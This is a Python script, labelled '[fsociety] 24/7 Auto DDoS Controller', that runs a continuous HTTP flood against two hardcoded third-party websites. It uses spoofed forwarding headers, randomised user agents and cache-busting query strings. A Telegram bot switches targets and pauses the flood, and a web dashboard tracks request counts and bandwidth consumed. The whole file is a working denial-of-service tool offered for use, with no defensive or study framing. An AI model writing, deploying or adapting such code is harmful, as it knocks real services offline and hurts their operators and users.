#!/usr/bin/env python3
"""
[fsociety] 24/7 Auto DDoS Controller
Deploy on Railway - Runs forever, controlled via Telegram
"""

import os
import sys
import time
import threading
import random
import string
import requests
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
import telegram
from telegram.ext import Updater, CommandHandler

# ========== CONFIG ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))  # Your Telegram user ID

# Attack targets
TARGETS = {
    "main": "https://emote-web-shadow.vercel.app",
    "key": "https://shadowxmods.alwaysdata.net",
}

# Auto-attack settings (24/7)
AUTO_TARGET = os.environ.get("AUTO_TARGET", "main")  # Which target to auto-attack
ATTACK_THREADS = int(os.environ.get("ATTACK_THREADS", "300"))

# Attack state
attack_active = True  # Auto-start = 24/7
attack_thread = None
stats = {
    "total_requests": 0,
    "bandwidth_mb": 0,
    "errors": 0,
    "start_time": datetime.now(),
    "target": TARGETS.get(AUTO_TARGET, TARGETS["main"])
}

# Flask app for webhook
app = Flask(__name__)

# ========== UTILITIES ==========
def random_string(n=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def random_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/115.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4) Mobile/15E148",
        ]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "Connection": "keep-alive"
    }

def generate_cache_buster():
    """Unique cache buster for every request"""
    return f"_cb={random_string(16)}&_t={int(time.time()*1000000)}&_r={random.randint(1,999999)}"

# ========== ATTACK ENGINE ==========
def attack_worker():
    """Main attack loop - runs 24/7"""
    global stats, attack_active
    
    session = requests.Session()
    target = stats["target"]
    
    print(f"[🔥] Attack started on {target}")
    print(f"[🔥] Threads: {ATTACK_THREADS}")
    
    while attack_active:
        try:
            # Random path + cache buster
            paths = ["/", "/api", "/key", "/getkey", "/generate", "/auth", "/verify", "/check"]
            path = random.choice(paths)
            cache_buster = generate_cache_buster()
            url = f"{target}{path}?{cache_buster}"
            
            headers = random_headers()
            resp = session.get(url, headers=headers, timeout=5)
            
            content_len = len(resp.content)
            stats["total_requests"] += 1
            stats["bandwidth_mb"] += content_len / (1024 * 1024)
            
            # Log every 1000 requests
            if stats["total_requests"] % 1000 == 0:
                bw_gb = stats["bandwidth_mb"] / 1024
                print(f"[📊] {stats['total_requests']:,} reqs | {bw_gb:.2f} GB | {resp.status_code}")
                
        except Exception as e:
            stats["errors"] += 1
            if stats["errors"] % 100 == 0:
                print(f"[💀] Error count: {stats['errors']}")

def start_attack():
    """Start the attack thread"""
    global attack_active, attack_thread
    
    if attack_thread and attack_thread.is_alive():
        return
    
    attack_active = True
    attack_thread = threading.Thread(target=attack_worker, daemon=True)
    attack_thread.start()

def stop_attack():
    """Stop the attack"""
    global attack_active
    attack_active = False
    time.sleep(2)

# ========== TELEGRAM COMMANDS ==========
def start_command(update, context):
    update.message.reply_text("""
🔥 [fsociety] 24/7 DDoS Controller

Status: RUNNING 24/7

Commands:
/status - Show live attack stats
/stop - Stop attack
/resume - Resume attack
/target <main|key> - Switch target
/help - Show this menu

Current target: {} {}""".format(
    AUTO_TARGET, 
    "🔴 AUTO-ATTACK" if attack_active else "⏸️ STOPPED"
))

def status_command(update, context):
    if not attack_active:
        update.message.reply_text("⚠️ Attack is stopped. Use /resume to start.")
        return
    
    elapsed = (datetime.now() - stats["start_time"]).total_seconds()
    rps = stats["total_requests"] / elapsed if elapsed > 0 else 0
    bw_gb = stats["bandwidth_mb"] / 1024
    
    msg = f"""
🔥 LIVE ATTACK STATUS

🎯 Target: {stats['target']}
📊 Requests: {stats['total_requests']:,}
💾 Bandwidth: {bw_gb:.2f} GB
⚡ Rate: {rps:.1f} req/s
⏱️ Duration: {elapsed/3600:.1f} hours
💀 Errors: {stats['errors']}

Status: 🔴 ATTACKING
"""
    update.message.reply_text(msg)

def stop_command(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    
    stop_attack()
    update.message.reply_text("⏸️ Attack stopped. Use /resume to start again.")

def resume_command(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    
    start_attack()
    update.message.reply_text("🔥 Attack resumed! 24/7 mode active.")

def target_command(update, context):
    if update.effective_user.id != ADMIN_ID:
        update.message.reply_text("❌ Unauthorized")
        return
    
    if not context.args:
        update.message.reply_text(f"Current target: {stats['target']}\nAvailable: {', '.join(TARGETS.keys())}")
        return
    
    target_key = context.args[0].lower()
    if target_key in TARGETS:
        stats["target"] = TARGETS[target_key]
        update.message.reply_text(f"✅ Target switched to: {stats['target']}")
    else:
        update.message.reply_text(f"❌ Unknown target. Available: {', '.join(TARGETS.keys())}")

# ========== FLASK WEBHOOK & MONITOR ==========
@app.route('/')
def index():
    return jsonify({
        "status": "online",
        "attack_active": attack_active,
        "total_requests": stats["total_requests"],
        "bandwidth_gb": stats["bandwidth_mb"] / 1024,
        "target": stats["target"]
    })

@app.route('/stats')
def stats_page():
    """Public dashboard"""
    elapsed = (datetime.now() - stats["start_time"]).total_seconds() if stats["start_time"] else 0
    rps = stats["total_requests"] / elapsed if elapsed > 0 else 0
    bw_gb = stats["bandwidth_mb"] / 1024
    
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>[fsociety] Attack Dashboard</title>
        <meta http-equiv="refresh" content="5">
        <style>
            body {{ background: #0a0a0a; color: #00ff00; font-family: monospace; padding: 20px; }}
            h1 {{ color: #ff4444; }}
            .stat {{ font-size: 20px; margin: 15px; }}
            .value {{ color: #ffff00; }}
            .good {{ color: #00ff00; }}
            .bad {{ color: #ff4444; }}
        </style>
    </head>
    <body>
        <h1>🔥 [fsociety] 24/7 DDoS Dashboard</h1>
        <div class="stat">Status: <span class="bad">🔴 ATTACKING</span></div>
        <div class="stat">Target: <span class="value">{stats['target']}</span></div>
        <div class="stat">Total Requests: <span class="value">{stats['total_requests']:,}</span></div>
        <div class="stat">Bandwidth Used: <span class="value">{bw_gb:.2f} GB</span></div>
        <div class="stat">Request Rate: <span class="value">{rps:.1f}</span> req/s</div>
        <div class="stat">Duration: <span class="value">{elapsed/3600:.1f}</span> hours</div>
        <div class="stat">Errors: <span class="value">{stats['errors']}</span></div>
        <hr>
        <div>Last update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
    </body>
    </html>
    """

@app.route('/health')
def health():
    return jsonify({"status": "ok", "timestamp": datetime.now().isoformat()})

# ========== WEBHOOK HANDLER ==========
@app.route(f'/webhook/{BOT_TOKEN}', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        update = telegram.Update.de_json(request.get_json(force=True), bot)
        dispatcher.process_update(update)
    return 'ok'

# ========== MAIN ==========
if __name__ == "__main__":
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN environment variable not set!")
        sys.exit(1)
    
    if not ADMIN_ID:
        print("⚠️ ADMIN_ID not set - only status command will work")
    
    # Setup bot
    bot = telegram.Bot(token=BOT_TOKEN)
    updater = Updater(token=BOT_TOKEN, use_context=True)
    dispatcher = updater.dispatcher
    
    # Register commands
    dispatcher.add_handler(CommandHandler("start", start_command))
    dispatcher.add_handler(CommandHandler("status", status_command))
    dispatcher.add_handler(CommandHandler("stop", stop_command))
    dispatcher.add_handler(CommandHandler("resume", resume_command))
    dispatcher.add_handler(CommandHandler("target", target_command))
    dispatcher.add_handler(CommandHandler("help", start_command))
    
    # Start attack thread (AUTO - 24/7)
    print("[*] Starting 24/7 attack thread...")
    start_attack()
    
    # Start Flask server
    port = int(os.environ.get("PORT", 8080))
    print(f"[*] Starting web server on port {port}")
    print(f"[*] Dashboard: https://your-app.up.railway.app/stats")
    
    app.run(host='0.0.0.0', port=port)